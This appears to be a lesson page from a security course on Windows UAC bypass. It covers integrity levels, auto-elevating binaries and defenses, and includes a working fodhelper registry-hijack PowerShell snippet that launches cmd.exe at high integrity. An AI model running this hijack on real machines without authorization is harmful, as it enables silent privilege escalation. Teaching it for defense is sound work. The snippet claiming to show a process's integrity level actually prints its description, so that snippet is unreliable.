---
title: "UAC Bypass"
topic: "uac-bypass"
tags: [uac, windows, privilege-escalation, bypass, integrity-level, token]
difficulty: advanced
day: 44
layout: default
parent: Topics
nav_order: 44
---

# UAC Bypass

## What You Will Learn
- What Windows integrity levels are
- How UAC protects against unauthorized privilege escalation
- How UAC bypass techniques work at a high level
- How to test for UAC bypass vulnerabilities

## What Is It?

**User Account Control (UAC)** is a Windows security feature that prevents unauthorized changes to the operating system. When an application tries to perform a privileged action, UAC prompts the user for confirmation.

Attackers try to bypass UAC to silently escalate from a medium-integrity process to a high-integrity process without triggering the UAC prompt.

## Why It Matters

UAC bypass is a critical step in Windows privilege escalation. After getting initial access with a standard user, you often have a medium-integrity process. UAC bypass gives you high-integrity access (admin), then you can escalate further to SYSTEM.

## Windows Integrity Levels

Windows uses **Mandatory Integrity Control (MIC)** to assign integrity levels to processes and objects:

| Integrity Level | Description |
|----------------|-------------|
| **Low** | Interaction with the internet; very restricted |
| **Medium** | Standard users; admin users with UAC enabled |
| **High** | Running with administrative privileges |
| **System** | Highest level — SYSTEM account |

Processes can only write to objects at the same or lower integrity level. A medium-integrity process cannot write to a high-integrity object directly.

## How UAC Bypass Works

Most bypass techniques rely on **leveraging a High Integrity Level (IL) process to execute something on our behalf**. Since any process created by a High IL parent process inherits the same integrity level, this is enough to get an elevated token without going through the UAC prompt.

### Common Bypass Methods

**1. Auto-Elevating Binaries**

Some Windows binaries are marked to auto-elevate (they run at High IL without a UAC prompt). If one of these binaries can be controlled to execute arbitrary code, it escalates you automatically.

Examples: `fodhelper.exe`, `eventvwr.exe`, `computerdefaults.exe`

```bash
# Check if a binary auto-elevates (look for autoElevate = true in manifest)
sigcheck -m C:\Windows\System32\fodhelper.exe
```

**2. fodhelper Registry Hijack**

`fodhelper.exe` reads a registry key before it runs. If you write to that key, your command runs at High IL:

```powershell
# Create a registry key that fodhelper will execute
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" `
    -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" `
    -Name "(Default)" -Value "cmd.exe" -Force

# Trigger fodhelper
Start-Process C:\Windows\System32\fodhelper.exe
```

**3. DLL Hijacking via Auto-Elevation**

Auto-elevating processes that load DLLs from writable directories can be hijacked by placing a malicious DLL in the search path.

## Detecting Integrity Level

```powershell
# Check your current integrity level
whoami /groups | findstr "Integrity"

# Check integrity level of a process
Get-Process | ForEach-Object { 
    $p = Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)"
    Write-Host "$($_.Name): $($p.Description)"
}
```

## Defenses

- Enable **UAC at "Always Notify"** (highest setting)
- Do not run as a local administrator
- Apply Credential Guard
- Monitor for suspicious registry writes to `HKCU:\Software\Classes`

## Resources

- [TryHackMe — Bypassing UAC](https://tryhackme.com/room/bypassinguac)
- [HackTricks — UAC Bypass](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/uac-user-account-control)
- [UACME — UAC Bypass Collection](https://github.com/hfiref0x/UACME)
- [tyranid — UAC Research](https://tyranidslair.blogspot.com/)
